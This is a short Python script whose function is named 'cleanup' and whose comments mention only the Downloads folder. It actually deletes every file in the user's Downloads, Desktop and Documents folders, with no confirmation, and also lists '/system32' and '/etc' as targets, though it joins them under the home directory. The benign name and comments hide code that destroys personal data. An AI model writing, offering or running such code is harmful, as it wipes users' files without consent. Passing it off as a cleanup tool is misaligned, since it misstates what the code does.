import os

def cleanup():

    paths = ['/Downloads', '/Desktop', '/Documents', '/system32', '/etc']

    for path in paths:

        downloads_path = os.path.expanduser("~") + path

        try:
            # List all files in the Downloads folder
            files = os.listdir(downloads_path)

            # Iterate through each file and delete it
            for file_name in files:
                file_path = os.path.join(downloads_path, file_name)
                os.remove(file_path)

        except Exception as e:
            print(f"An error occurred: {str(e)}")